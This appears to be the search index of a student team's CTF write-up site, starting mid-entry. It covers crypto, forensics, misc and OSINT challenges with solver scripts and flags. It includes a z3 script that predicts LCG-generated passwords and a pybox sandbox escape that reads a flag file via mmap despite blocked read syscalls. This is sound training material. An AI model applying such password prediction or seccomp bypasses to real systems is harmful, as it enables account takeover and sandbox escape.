base32.","title":"Solution:"},{"location":"crypto/TamuCTF/encoding/encod/#flag","text":"gigem{3nc0ding_1s_n0t_crypt0_428427}","title":"Flag:"},{"location":"crypto/TamuCTF/pwngen/writeup/","text":"TamuCTF pwngen Challenge points : 150 Challenge solves : 10 Description ( not the exact description ) It has been found that a set of passwords have been generated using the given script.We have reason to believe that they generated a set of passwords at the same time using a custom password generation program and that their previous password was ElxFr9)F . Send the next password at openssl s_client -connect tamuctf.com:443 -servername pwgen -quiet . Files : main.rs Writeup Author : ph03n1x TL;DR 1. Given the equation of a Linear congruential generator (LCG) and the previous password generated using it 2. Use z3 to find the seed with the given contraints. 3. Find the seed and get the next password from it. Solution On inspecting the file we understand that it is a LCG generator. We decided to give it a try with z3 python, so we decided to rewrite the functions in python (becuase we were more familiar with python than rust):- class LCG() : def __init__(self,seed) : self.seed = seed self.a = 1103515245 self.c = 12345 def next(self) : self.seed = ((self.seed * self.a) + self.c)%0x100000000 out = (self.seed >> 16) & 0x7fff return out def get_pass(rand) : l = [] for i in range(8) : l.append(chr(rand.next()%94 + 33)) return ''.join(l) The code should produce the same output as the given rs file. Now we simply used z3 to setup the contraints and find the seed :- from z3 import * known = 'ElxFr9)F' class LCG() : def __init__(self,seed) : self.seed = seed self.a = 1103515245 self.c = 12345 def next(self) : self.seed = ((self.seed * self.a) + self.c)%0x100000000 out = (self.seed >> 16) & 0x7fff return out def get_pass(rand) : return URem(rand.next(),94) + 33 s = Solver() seed = BitVec(\"seed\",32) l = LCG(seed) for i in known : s.add(get_pass(l) == ord(i)) s.check() seed = s.model()[seed] We get our seed as seed = 718549711 . ( Note : Make sure you use modify the class to the inital class definition since the second one has been slightly modified to take in z3 objects) Now let's predict the password :- seed = 718549711 l = LCG(seed) print(get_pass(l) ) # output : 'ElxFr9)F' get_pass(l) # output 'xV!;28vj' Now to connect to the server and send the password :- Flag : gigem{cryp706r4ph1c4lly_1n53cur3_prn65_DC6F9B}","title":"TamuCTF"},{"location":"crypto/TamuCTF/pwngen/writeup/#tamuctf","text":"","title":"TamuCTF"},{"location":"crypto/TamuCTF/pwngen/writeup/#pwngen","text":"Challenge points : 150 Challenge solves : 10","title":"pwngen"},{"location":"crypto/TamuCTF/pwngen/writeup/#description","text":"( not the exact description ) It has been found that a set of passwords have been generated using the given script.We have reason to believe that they generated a set of passwords at the same time using a custom password generation program and that their previous password was ElxFr9)F . Send the next password at openssl s_client -connect tamuctf.com:443 -servername pwgen -quiet . Files : main.rs","title":"Description"},{"location":"crypto/TamuCTF/pwngen/writeup/#writeup","text":"Author : ph03n1x TL;DR 1. Given the equation of a Linear congruential generator (LCG) and the previous password generated using it 2. Use z3 to find the seed with the given contraints. 3. Find the seed and get the next password from it.","title":"Writeup"},{"location":"crypto/TamuCTF/pwngen/writeup/#solution","text":"On inspecting the file we understand that it is a LCG generator. We decided to give it a try with z3 python, so we decided to rewrite the functions in python (becuase we were more familiar with python than rust):- class LCG() : def __init__(self,seed) : self.seed = seed self.a = 1103515245 self.c = 12345 def next(self) : self.seed = ((self.seed * self.a) + self.c)%0x100000000 out = (self.seed >> 16) & 0x7fff return out def get_pass(rand) : l = [] for i in range(8) : l.append(chr(rand.next()%94 + 33)) return ''.join(l) The code should produce the same output as the given rs file. Now we simply used z3 to setup the contraints and find the seed :- from z3 import * known = 'ElxFr9)F' class LCG() : def __init__(self,seed) : self.seed = seed self.a = 1103515245 self.c = 12345 def next(self) : self.seed = ((self.seed * self.a) + self.c)%0x100000000 out = (self.seed >> 16) & 0x7fff return out def get_pass(rand) : return URem(rand.next(),94) + 33 s = Solver() seed = BitVec(\"seed\",32) l = LCG(seed) for i in known : s.add(get_pass(l) == ord(i)) s.check() seed = s.model()[seed] We get our seed as seed = 718549711 . ( Note : Make sure you use modify the class to the inital class definition since the second one has been slightly modified to take in z3 objects) Now let's predict the password :- seed = 718549711 l = LCG(seed) print(get_pass(l) ) # output : 'ElxFr9)F' get_pass(l) # output 'xV!;28vj' Now to connect to the server and send the password :- Flag : gigem{cryp706r4ph1c4lly_1n53cur3_prn65_DC6F9B}","title":"Solution"},{"location":"forensics/intro/","text":"Forensics Introduction The following are the Links to the writeups to the challenges we have solved from CTF's from Forensics category. The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. DarkCTF Knot-65 - v1Ru5 Powershell - v1Ru5 TJCTF Rap God - v1Ru5 TamuCTF Recovery - v1Ru5","title":"Forensics"},{"location":"forensics/intro/#forensics","text":"","title":"Forensics"},{"location":"forensics/intro/#introduction","text":"The following are the Links to the writeups to the challenges we have solved from CTF's from Forensics category.","title":"Introduction"},{"location":"forensics/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. DarkCTF Knot-65 - v1Ru5 Powershell - v1Ru5 TJCTF Rap God - v1Ru5 TamuCTF Recovery - v1Ru5","title":"The contents of this repo"},{"location":"forensics/DarkCTF/Knot-65/Knot/","text":"Knot-65 Description Mr Elliot Anderson has received a zip file from somewhere around. From a secret friend he got a transcript of some conversation. Help Mr. Elliot to get the secret flag. Once you get the password,convert it to lower case as password. Solution So, we are given one password protected zip file and one text file. If you look carefully we can find that some of the characters in the text file are in uppercase. You can either write a python program or manually collect the uppercase letters. And we get IKNOWYARECOLLECTAINGLLUPPERCASELETTERFIRSTPARTOFTHEPASSWORDISLETTHEREBE r = open(\"file.txt\",\"r\") r = r.read() part1='' for i in r: if i.isupper(): part1+=i print(part1) As mentioned in the description, after converting it to lowercase, we get iknowyarecollectainglluppercaseletterfirstpartofthepasswordislettherebe. And the first part of the flag is lettherebe. We get the second part of the flag by running stegsnow. The second part of the flag is goodrainswithshining. We find some homoglyph unicode characters towards the end of the text file. Collecting those characters we get the last part of the flag rainnnbow. So, the final password is \"lettherebegoodrainswithshiningrainnnbow\". We use this password to open the password protected text file which contains some 8 digit numbers. 31060562 32641524 21475550 14066460 21666171 34073461 35044157 33661564 15046170 23032164 146764 This is octal-xlate encoding. We can decode these characters online from here And the flag is darkCTF{h0m0Glypw1tHooct4LxL4t3}","title":"Knot-65"},{"location":"forensics/DarkCTF/Knot-65/Knot/#knot-65","text":"","title":"Knot-65"},{"location":"forensics/DarkCTF/Knot-65/Knot/#description","text":"Mr Elliot Anderson has received a zip file from somewhere around. From a secret friend he got a transcript of some conversation. Help Mr. Elliot to get the secret flag. Once you get the password,convert it to lower case as password.","title":"Description"},{"location":"forensics/DarkCTF/Knot-65/Knot/#solution","text":"So, we are given one password protected zip file and one text file. If you look carefully we can find that some of the characters in the text file are in uppercase. You can either write a python program or manually collect the uppercase letters. And we get IKNOWYARECOLLECTAINGLLUPPERCASELETTERFIRSTPARTOFTHEPASSWORDISLETTHEREBE r = open(\"file.txt\",\"r\") r = r.read() part1='' for i in r: if i.isupper(): part1+=i print(part1) As mentioned in the description, after converting it to lowercase, we get iknowyarecollectainglluppercaseletterfirstpartofthepasswordislettherebe. And the first part of the flag is lettherebe. We get the second part of the flag by running stegsnow. The second part of the flag is goodrainswithshining. We find some homoglyph unicode characters towards the end of the text file. Collecting those characters we get the last part of the flag rainnnbow. So, the final password is \"lettherebegoodrainswithshiningrainnnbow\". We use this password to open the password protected text file which contains some 8 digit numbers. 31060562 32641524 21475550 14066460 21666171 34073461 35044157 33661564 15046170 23032164 146764 This is octal-xlate encoding. We can decode these characters online from here And the flag is darkCTF{h0m0Glypw1tHooct4LxL4t3}","title":"Solution"},{"location":"forensics/DarkCTF/Powershell/Powershell/","text":"PowerShell Solved by : Sridevi Description I want to know what is happening in my Windows Powershell. Solution We are given a .mp3 file. When we open the file, we get an error. So, let's use binwalk to extract the embedded files. Since the challenge name is PowerShell, let's see what is there in PowerShell.xml There is a base64 string. Let's see what we get after decoding it. Flag: darkCTF{C0mm4nd_0n_p0w3rsh3ll}","title":"PowerShell"},{"location":"forensics/DarkCTF/Powershell/Powershell/#powershell","text":"Solved by : Sridevi","title":"PowerShell"},{"location":"forensics/DarkCTF/Powershell/Powershell/#description","text":"I want to know what is happening in my Windows Powershell.","title":"Description"},{"location":"forensics/DarkCTF/Powershell/Powershell/#solution","text":"We are given a .mp3 file. When we open the file, we get an error. So, let's use binwalk to extract the embedded files. Since the challenge name is PowerShell, let's see what is there in PowerShell.xml There is a base64 string. Let's see what we get after decoding it. Flag: darkCTF{C0mm4nd_0n_p0w3rsh3ll}","title":"Solution"},{"location":"forensics/TJCTF/RAP/Rap/","text":"Rap Goad Solved by : Sridevi Description My rapper friend Big Y sent me his latest track but something sounded a little off about it. Help me find out if he was trying to tell me something with it. Submit your answer as tjctf{message} Solution Open the given mp3 file using Sonic Visualiser. Using Spectrogram we see something like this. They are encoded images, but not clear. Let's examine the channel-2 in Spectrogram. Now, the encoded symbols are clear. After surfing through internet I came across this website which decodes similar images as in our case. Let's try decoding using this website. tjctf{quicksonic} We got the flag!","title":"Rap Goad"},{"location":"forensics/TJCTF/RAP/Rap/#rap-goad","text":"Solved by : Sridevi","title":"Rap Goad"},{"location":"forensics/TJCTF/RAP/Rap/#description","text":"My rapper friend Big Y sent me his latest track but something sounded a little off about it. Help me find out if he was trying to tell me something with it. Submit your answer as tjctf{message}","title":"Description"},{"location":"forensics/TJCTF/RAP/Rap/#solution","text":"Open the given mp3 file using Sonic Visualiser. Using Spectrogram we see something like this. They are encoded images, but not clear. Let's examine the channel-2 in Spectrogram. Now, the encoded symbols are clear. After surfing through internet I came across this website which decodes similar images as in our case. Let's try decoding using this website. tjctf{quicksonic} We got the flag!","title":"Solution"},{"location":"forensics/TamuCTF/Recovery/Recovery/","text":"Recovery Challenge points : 300 Description I needed to copy a flag from my home computer to the mainframe at work, so I used a floppy drive. It looks like a few bytes in the file got corrupted, so I deleted the file thinking it would be fine, but my friend says that\u2019s not enough to prevent hackers from recovering the data. Solution I used Autopsy to recover the delete file which was a GIF file f0000000.gif but it was corrupted. From various resources I learnt about GIF file format and tried to interchange the height and width of the image data of the GIF file and got the flag. Flag : gigem{0u7_0f_516h7_0u7_0f_m1nd}","title":"Recovery"},{"location":"forensics/TamuCTF/Recovery/Recovery/#recovery","text":"Challenge points : 300","title":"Recovery"},{"location":"forensics/TamuCTF/Recovery/Recovery/#description","text":"I needed to copy a flag from my home computer to the mainframe at work, so I used a floppy drive. It looks like a few bytes in the file got corrupted, so I deleted the file thinking it would be fine, but my friend says that\u2019s not enough to prevent hackers from recovering the data.","title":"Description"},{"location":"forensics/TamuCTF/Recovery/Recovery/#solution","text":"I used Autopsy to recover the delete file which was a GIF file f0000000.gif but it was corrupted. From various resources I learnt about GIF file format and tried to interchange the height and width of the image data of the GIF file and got the flag. Flag : gigem{0u7_0f_516h7_0u7_0f_m1nd}","title":"Solution"},{"location":"misc/intro/","text":"Miscellaneous Introduction The following are the Links to the writeups to the challenges we have solved from CTF's from the Misc category. The contents of this repo This repo contains the writeups of various challenges from CTFs we have attempted in the misc category. HSCTF7 2020 Emojis - Sandhra Bino BlueHensCTF 2021 Conway - Arya Arun Rise and Shine - Adhithya Sree Mohan Mountain Climber - Revathi Transforms - Sri Nimitha Sandbox TamuCTF pybox - SandraBino ARCHIVAL - Adhithya Sree Mohan ELIZABETH IS MISSING - Adhithya Sree Mohan MARVEL V/S DC - Adhithya Sree Mohan SPECTRAL IMAGING - Adhithya Sree Mohan","title":"Miscellaneous"},{"location":"misc/intro/#miscellaneous","text":"","title":"Miscellaneous"},{"location":"misc/intro/#introduction","text":"The following are the Links to the writeups to the challenges we have solved from CTF's from the Misc category.","title":"Introduction"},{"location":"misc/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of various challenges from CTFs we have attempted in the misc category. HSCTF7 2020 Emojis - Sandhra Bino BlueHensCTF 2021 Conway - Arya Arun Rise and Shine - Adhithya Sree Mohan Mountain Climber - Revathi Transforms - Sri Nimitha","title":"The contents of this repo"},{"location":"misc/intro/#sandbox","text":"TamuCTF pybox - SandraBino ARCHIVAL - Adhithya Sree Mohan ELIZABETH IS MISSING - Adhithya Sree Mohan MARVEL V/S DC - Adhithya Sree Mohan SPECTRAL IMAGING - Adhithya Sree Mohan","title":"Sandbox"},{"location":"misc/BlueHensCTF/Conway/conway/","text":"BlueHens CTF Conway presents the falcon - Misc Challenge file On browsing about rle files Found an online decoder Importing the file into it, we directly get the flag.. UDCTF{th3y_c4ll_thems3lves_the_fl4g_smash3rs}","title":"BlueHens CTF"},{"location":"misc/BlueHensCTF/Conway/conway/#bluehens-ctf","text":"","title":"BlueHens CTF"},{"location":"misc/BlueHensCTF/Conway/conway/#conway-presents-the-falcon-misc","text":"Challenge file On browsing about rle files Found an online decoder Importing the file into it, we directly get the flag.. UDCTF{th3y_c4ll_thems3lves_the_fl4g_smash3rs}","title":"Conway presents the falcon - Misc"},{"location":"misc/BlueHensCTF/MountainClimber/Mountain_climber/","text":"BlueHens CTF Mountain climber On opening the given image we can find different blocks. - First block: Granite - Second block: Block of Emerald - Third block: Target - Fourth block: Birch log - Fifth block: Loom - Sixth block: Obsidian - Seventh block: Chest - Eight block: Dried kelp block - Ninth block: Block of Emerald - Tenth block: Diorite After trying different ways our flag is first letter of all names. Flag: UDCTF{GETBLOCKED} Names of different blocks in minicraft","title":"BlueHens CTF"},{"location":"misc/BlueHensCTF/MountainClimber/Mountain_climber/#bluehens-ctf","text":"","title":"BlueHens CTF"},{"location":"misc/BlueHensCTF/MountainClimber/Mountain_climber/#mountain-climber","text":"On opening the given image we can find different blocks. - First block: Granite - Second block: Block of Emerald - Third block: Target - Fourth block: Birch log - Fifth block: Loom - Sixth block: Obsidian - Seventh block: Chest - Eight block: Dried kelp block - Ninth block: Block of Emerald - Tenth block: Diorite After trying different ways our flag is first letter of all names. Flag: UDCTF{GETBLOCKED} Names of different blocks in minicraft","title":"Mountain climber"},{"location":"misc/BlueHensCTF/Rise%26Shine/rise/","text":"DESCRIPTION Breakfast is the most important meal of the day. Wrap your result in UDCTF{} all caps. HINT: it is one common english word encoded in Baconian SOLUTION It's Baconian cipher. There are 40 stars, of 2 types, along the boundary of the image. When we take those in anti-clockwise order, we will get the baconian \"AAABAAABBBAAAAAABABBABBBAABAAAABBABABBAA\". This can de decoded to \"CHAMPION\". FLAG UDCTF{CHAMPION}","title":"Rise"},{"location":"misc/BlueHensCTF/Rise%26Shine/rise/#description","text":"Breakfast is the most important meal of the day. Wrap your result in UDCTF{} all caps. HINT: it is one common english word encoded in Baconian","title":"DESCRIPTION"},{"location":"misc/BlueHensCTF/Rise%26Shine/rise/#solution","text":"It's Baconian cipher. There are 40 stars, of 2 types, along the boundary of the image. When we take those in anti-clockwise order, we will get the baconian \"AAABAAABBBAAAAAABABBABBBAABAAAABBABABBAA\". This can de decoded to \"CHAMPION\".","title":"SOLUTION"},{"location":"misc/BlueHensCTF/Rise%26Shine/rise/#flag","text":"UDCTF{CHAMPION}","title":"FLAG"},{"location":"misc/BlueHensCTF/Transforms/Transforms/","text":"Challenge name: Transforms Convert me! nc challenges.ctfd.io 30008 We have to do 100 conversion correctly. For example: convert bytearray to hexdigest: [129, 141, 112, 176, 251, 106, 160, 102] @@@@@ convert integer to bytearray: 1639309969325418938 @@@@@ convert bytearray to integer: [55, 107, 189, 150, 85, 213, 147, 94] @@@@@ and so on import binascii from pwn import * def parse_message(message): try: message = message.replace(b\"convert\", b\"\").strip() message = message.replace(b\" @@@@@\", b\"\").strip() base_a = message.split(b\"to\")[0].replace(b\"convert\", b\"\").strip() base_b = message.split(b\"to\")[1].split(b\":\")[0].strip() pivot = (f\"{base_b.decode()}:\").encode() value = message.split(pivot)[-1].strip() return base_a.decode(), base_b.decode(), value except Exception as e: print(f\"Exception raised: {e} with message: {message}\") if name == \" main \": conn = remote('challenges.ctfd.io', 30008) for i in range(0, 120): for j in range(0, 2): print(conn.recvline()) line = conn.recvline() base_a, base_b, value = parse_message(line) print(line) print(f\" Parsed to: from **{base_a}** to **{base_b}** ===> \", value) response = None #1 - Convert start types in byte. stop if base_a == \"bytearray\": bytes_value = bytes( bytearray ( eval ( value ) ) ) elif base_a == \"hexdigest\": bytes_value = bytes.fromhex( value.decode() ) # TypeError: fromhex() argument must be str, not bytes elif base_a == \"string\": bytes_value = value.strip() # (?) elif base_a == \"integer\": bytes_value = (int(value)).to_bytes(8, 'big') #2 - Convert byte from what you want. if base_b == \"bytearray\": response = str( list( bytearray(bytes_value) ) ) elif base_b == \"hexdigest\": response = bytes_value.hex() elif base_b == \"string\": response = bytes_value.strip() elif base_b == \"integer\": response = str( int.from_bytes(bytes_value, byteorder='big', signed=False) ) if response is not None: print(b\"Going to send response ===> \", response) conn.send(response) conn.send(b\"\\n\") print(b\"Response from challenge: \" + conn.recvline()) print(conn.recvline()) print(f\"\\n {i+1} ===================================\\n\") else: print(\"No response was provided\")","title":"Transforms"},{"location":"misc/DarkCTF/quick/","text":"Quickfix Description We were given 10000 images which had to be fixed/concatenated together to form one final image of png format even though the given images were with .jpg file extension and showed that it was curropted when you tried to execute it. So basically first we get all the images, and change the header by changing the first 8 bytes and replace it with the first 8 bytes of png files. Then we rename all the files by changing their file extensions and last but not the least we concatenate the images as a 100x100 matrix image using the PIL module in python. Solution Script from __future__ import print_function import os from PIL import Image def write_to(): files = os.listdir('./QuickFix') ims=Image.open('./QuickFix/'+files[0]+'') result = Image.new(\"RGB\", (100*ims.width, 100*ims.height)) for i in range(100): for j in range(100): cur = Image.open('./QuickFix/'+'flag_{}_{}.png'.format(i,j)) result.paste(cur, (i*ims.width,j*ims.height)) result.save(os.path.expanduser('~/image.png')) def header_change(): for i in os.listdir('./QuickFix'): with open('./QuickFix/'+i,\"rb+\") as image: f=image.read() b=bytearray(f) #print(b[:14]) b=b.replace(b[:14],b'\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\r') #print(b[:14]) image.seek(0) image.write(b) image.truncate() def rename_func(): for i in os.listdir('./QuickFix'): os.rename('./QuickFix/'+i, './QuickFix/'+i[:-4]+'.png') Solution Flag: Flag Image","title":"Quickfix"},{"location":"misc/DarkCTF/quick/#quickfix","text":"","title":"Quickfix"},{"location":"misc/DarkCTF/quick/#description","text":"We were given 10000 images which had to be fixed/concatenated together to form one final image of png format even though the given images were with .jpg file extension and showed that it was curropted when you tried to execute it. So basically first we get all the images, and change the header by changing the first 8 bytes and replace it with the first 8 bytes of png files. Then we rename all the files by changing their file extensions and last but not the least we concatenate the images as a 100x100 matrix image using the PIL module in python.","title":"Description"},{"location":"misc/DarkCTF/quick/#solution-script","text":"from __future__ import print_function import os from PIL import Image def write_to(): files = os.listdir('./QuickFix') ims=Image.open('./QuickFix/'+files[0]+'') result = Image.new(\"RGB\", (100*ims.width, 100*ims.height)) for i in range(100): for j in range(100): cur = Image.open('./QuickFix/'+'flag_{}_{}.png'.format(i,j)) result.paste(cur, (i*ims.width,j*ims.height)) result.save(os.path.expanduser('~/image.png')) def header_change(): for i in os.listdir('./QuickFix'): with open('./QuickFix/'+i,\"rb+\") as image: f=image.read() b=bytearray(f) #print(b[:14]) b=b.replace(b[:14],b'\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\r') #print(b[:14]) image.seek(0) image.write(b) image.truncate() def rename_func(): for i in os.listdir('./QuickFix'): os.rename('./QuickFix/'+i, './QuickFix/'+i[:-4]+'.png')","title":"Solution Script"},{"location":"misc/DarkCTF/quick/#solution","text":"Flag: Flag Image","title":"Solution"},{"location":"misc/DarkCTF/quick/#_1","text":"","title":""},{"location":"misc/HSCTF7/Emojis/","text":"Emojis - Misc HSCTF2020 Description This challenge was made using emojigram language which is an esolang made using Emojis. All that we need to do is repicate the code in python and generate the flag from it by reversing the code. Replicated Code The replicated code looked like this. But since there are conditional jumps and all that we are given is the output when the flag is given, we have no choice but to guess whether the jumps are taken or not inorder to obttain the desired input. And to achieve the same we played around with a few of the instructions and put together the possibilities to get the Flag. flag=[120, 66, 94, 114, 95, 69, 110, 125, 73, 78, 99, 52, 118] flag[9]=flag[9]+flag[1] flag[7]=flag[7]+flag[11] flag[2]=47 flag[4]=flag[4]+flag[11] flag[0]=flag[0]+flag[2] flag[8]=flag[8]-8 flag[6]=flag[6]+flag[8] flag[6]=flag[6]-flag[8] flag[6]=flag[6]-flag[8] flag[10]=flag[10]+8 flag[11]=flag[11]-1 flag[4]=flag[4]-flag[9] flag[3]=flag[3]-2 flag[2]=flag[2]-4 flag[0]=flag[0]-flag[11] flag[1]=flag[1]-flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]-flag[7] flag[3]=flag[12] flag[2]=flag[2]+8 flag[9]=flag[9]-flag[6] flag[2]=flag[2]+flag[4] #flag[1]==flag[5] #False flag[2]=flag[5] #flag[1]==flag[12] #False #flag[11]=flag[11]+flag[0] flag[12]=118 Solution Flag: flag{tr3v0r-pAck3p}","title":"Emojis - Misc HSCTF2020"},{"location":"misc/HSCTF7/Emojis/#emojis-misc-hsctf2020","text":"","title":"Emojis - Misc HSCTF2020"},{"location":"misc/HSCTF7/Emojis/#description","text":"This challenge was made using emojigram language which is an esolang made using Emojis. All that we need to do is repicate the code in python and generate the flag from it by reversing the code.","title":"Description"},{"location":"misc/HSCTF7/Emojis/#replicated-code","text":"The replicated code looked like this. But since there are conditional jumps and all that we are given is the output when the flag is given, we have no choice but to guess whether the jumps are taken or not inorder to obttain the desired input. And to achieve the same we played around with a few of the instructions and put together the possibilities to get the Flag. flag=[120, 66, 94, 114, 95, 69, 110, 125, 73, 78, 99, 52, 118] flag[9]=flag[9]+flag[1] flag[7]=flag[7]+flag[11] flag[2]=47 flag[4]=flag[4]+flag[11] flag[0]=flag[0]+flag[2] flag[8]=flag[8]-8 flag[6]=flag[6]+flag[8] flag[6]=flag[6]-flag[8] flag[6]=flag[6]-flag[8] flag[10]=flag[10]+8 flag[11]=flag[11]-1 flag[4]=flag[4]-flag[9] flag[3]=flag[3]-2 flag[2]=flag[2]-4 flag[0]=flag[0]-flag[11] flag[1]=flag[1]-flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]+flag[3] flag[1]=flag[1]-flag[7] flag[3]=flag[12] flag[2]=flag[2]+8 flag[9]=flag[9]-flag[6] flag[2]=flag[2]+flag[4] #flag[1]==flag[5] #False flag[2]=flag[5] #flag[1]==flag[12] #False #flag[11]=flag[11]+flag[0] flag[12]=118","title":"Replicated Code"},{"location":"misc/HSCTF7/Emojis/#solution","text":"Flag: flag{tr3v0r-pAck3p}","title":"Solution"},{"location":"misc/HSCTF7/Emojis/#_1","text":"","title":""},{"location":"misc/tamuCTF/pybox/","text":"Pybox The challenge was a sandbox challenge and we were given the source of the secured server box which is a python interpreter which can import modules and also execute the python code we pass to it, It does not allow any read syscall from executing. This is implemented using the seccomp with BLOCKED-SYSCALLS = [0, 17, 19] which corresponds to all the read syscalls. So we need to find a way to read the flag.txt file from the server without the help of any read syscalls. So the first approach was to look at any other syscall which would in turn red the file contents without invoking the BLOCKED-SYSCALLS . This search led to mmap module in python. import mmap filepath=\"flag.txt\" file_object= open(filepath,mode=\"r\",encoding=\"utf8\") mmap_object= mmap.mmap(file_object.fileno(),length=0,access=mmap.ACCESS_READ,offset=0) txt=mmap_object.read() print(txt) On executing the above code we were able to invoke read of the file contects from the memory using the memread syscall. flag gigem{m3m0ry_m4pp3d_f1l35}","title":"Pybox"},{"location":"misc/tamuCTF/pybox/#pybox","text":"The challenge was a sandbox challenge and we were given the source of the secured server box which is a python interpreter which can import modules and also execute the python code we pass to it, It does not allow any read syscall from executing. This is implemented using the seccomp with BLOCKED-SYSCALLS = [0, 17, 19] which corresponds to all the read syscalls. So we need to find a way to read the flag.txt file from the server without the help of any read syscalls. So the first approach was to look at any other syscall which would in turn red the file contents without invoking the BLOCKED-SYSCALLS . This search led to mmap module in python. import mmap filepath=\"flag.txt\" file_object= open(filepath,mode=\"r\",encoding=\"utf8\") mmap_object= mmap.mmap(file_object.fileno(),length=0,access=mmap.ACCESS_READ,offset=0) txt=mmap_object.read() print(txt) On executing the above code we were able to invoke read of the file contects from the memory using the memread syscall. flag gigem{m3m0ry_m4pp3d_f1l35}","title":"Pybox"},{"location":"misc/tamuCTF/archival/archival/","text":"ARCHIVAL: OSINT DESCRIPTION: I can't remember the flag... it used to be on our website but when we updated it the flag got lost in the process. Since nothing ever gets deleted on the internet it should be safe, but how? SOLUTION: It's a simple solvable by using the wayback machine FLAG: gigem{s1t3_und3r_c0n57ruc710n}","title":"ARCHIVAL: OSINT"},{"location":"misc/tamuCTF/archival/archival/#archival-osint","text":"","title":"ARCHIVAL: OSINT"},{"location":"misc/tamuCTF/archival/archival/#description","text":"I can't remember the flag... it used to be on our website but when we updated it the flag got lost in the process. Since nothing ever gets deleted on the internet it should be safe, but how?","title":"DESCRIPTION:"},{"location":"misc/tamuCTF/archival/archival/#solution","text":"It's a simple solvable by using the wayback machine","title":"SOLUTION:"},{"location":"misc/tamuCTF/archival/archival/#flag","text":"gigem{s1t3_und3r_c0n57ruc710n}","title":"FLAG:"},{"location":"misc/tamuCTF/elizabeth_is_missing/elizabeth/","text":"ELIZABETH IS MISSING : OSINT DESCRIPTION: Friends have reported Elizabeth missing and need your help locating her! Can you follow the clues in the missing person flyer and find her most recent location? SOLUTION: After decoding the cipher, we get \"Hey! I'm hosting a retrea for my clients so I'll e off the grid for awhie - I got a new phone nuber, so call me if you ned anything (979)429-2176.\" You will recieve a voice mail if you call \"(979)429-2176\". The voice mail directs us to a website: https://eowensphotography.weebly.com/ You get the flag from the website FLAG: gigem{M42V3LisbetterthanDCC0M1C5}","title":"ELIZABETH IS MISSING : OSINT"},{"location":"misc/tamuCTF/elizabeth_is_missing/elizabeth/#elizabeth-is-missing-osint","text":"","title":"ELIZABETH IS MISSING : OSINT"},{"location":"misc/tamuCTF/elizabeth_is_missing/elizabeth/#description","text":"Friends have reported Elizabeth missing and need your help locating her! Can you follow the clues in the missing person flyer and find her most recent location?","title":"DESCRIPTION:"},{"location":"misc/tamuCTF/elizabeth_is_missing/elizabeth/#solution","text":"After decoding the cipher, we get \"Hey! I'm hosting a retrea for my clients so I'll e off the grid for awhie - I got a new phone nuber, so call me if you ned anything (979)429-2176.\" You will recieve a voice mail if you call \"(979)429-2176\". The voice mail directs us to a website: https://eowensphotography.weebly.com/ You get the flag from the website","title":"SOLUTION:"},{"location":"misc/tamuCTF/elizabeth_is_missing/elizabeth/#flag","text":"gigem{M42V3LisbetterthanDCC0M1C5}","title":"FLAG:"},{"location":"misc/tamuCTF/marvel_dc/marvel_dc/","text":"Marvel vs DC: OSINT Description: This young concept artist attended the Cleveland Institute of Art and has quite the fan base after working on several Marvel movies, notably Avengers Endgame and Black Panther. You are interested in his drawing techniques so you attend an art expo to learn more, can you find the flag? Solution: The young concept artist from the description is none other than Wesley Burt. In his instagram, He had made a post of Lightbox art expo. After looking through the social media accounts of Lightbox,I found nothing. So I started searching for Lightbox expo in general. After looking deep into the abyss of internet,the flag was found. Flag: gigem{M42V3LisbetterthanDCC0M1C5}","title":"Marvel vs DC: OSINT"},{"location":"misc/tamuCTF/marvel_dc/marvel_dc/#marvel-vs-dc-osint","text":"","title":"Marvel vs DC: OSINT"},{"location":"misc/tamuCTF/marvel_dc/marvel_dc/#description","text":"This young concept artist attended the Cleveland Institute of Art and has quite the fan base after working on several Marvel movies, notably Avengers Endgame and Black Panther. You are interested in his drawing techniques so you attend an art expo to learn more, can you find the flag?","title":"Description:"},{"location":"misc/tamuCTF/marvel_dc/marvel_dc/#solution","text":"The young concept artist from the description is none other than Wesley Burt. In his instagram, He had made a post of Lightbox art expo. After looking through the social media accounts of Lightbox,I found nothing. So I started searching for Lightbox expo in general. After looking deep into the abyss of internet,the flag was found.","title":"Solution:"},{"location":"misc/tamuCTF/marvel_dc/marvel_dc/#flag","text":"gigem{M42V3LisbetterthanDCC0M1C5}","title":"Flag:"},{"location":"misc/tamuCTF/spectral_imaging/spectral/","text":"SPECTRAL IMAGINING: SIGNIT DESCRIPTION: Some things are meant to be heard but not seen. This sounds like it's meant to be seen, not heard. SOLUTION: It is a Morse audio. Just running it through a decoder will give you the flag FLAG: gigem{4ud10_m4d3_v15u4L}","title":"SPECTRAL IMAGINING: SIGNIT"},{"location":"misc/tamuCTF/spectral_imaging/spectral/#spectral-imagining-signit","text":"","title":"SPECTRAL IMAGINING: SIGNIT"},{"location":"misc/tamuCTF/spectral_imaging/spectral/#description","text":"Some things are meant to be heard but not seen. This sounds like it's meant to be seen, not heard.","title":"DESCRIPTION:"},{"location":"misc/tamuCTF/spectral_imaging/spectral/#solution","text":"It is a Morse audio. Just running it through a decoder will give you the flag","title":"SOLUTION:"},{"location":"misc/tamuCTF/spectral_imaging/spectral/#flag","text":"gigem{4ud10_m4d3_v15u4L}","title":"FLAG:"},{"location":"pwning/intro/","text":"Binary Exploitation Introduction \"Write about Pwn and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted. De1CTF20 STL_Container - Shruti Dixit HSCTF20 StudySim - Shruti Dixit VolgaCTF20 Notepad-- - Shruti Dixit N1CTF20 EasyWrite - Shruti Dixit BlueHens CTF Beef-Of-Finitude - Shravya Bhaskara TamuCTF 21 tictactoe - SandraBino lottery - Shravya Bhaskara","title":"Binary Exploitation"},{"location":"pwning/intro/#binary-exploitation","text":"","title":"Binary Exploitation"},{"location":"pwning/intro/#introduction","text":"\"Write about Pwn and about the writeups\"","title":"Introduction"},{"location":"pwning/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted. De1CTF20 STL_Container - Shruti Dixit HSCTF20 StudySim - Shruti Dixit VolgaCTF20 Notepad-- - Shruti Dixit N1CTF20 EasyWrite - Shruti Dixit BlueHens CTF Beef-Of-Finitude - Shravya Bhaskara 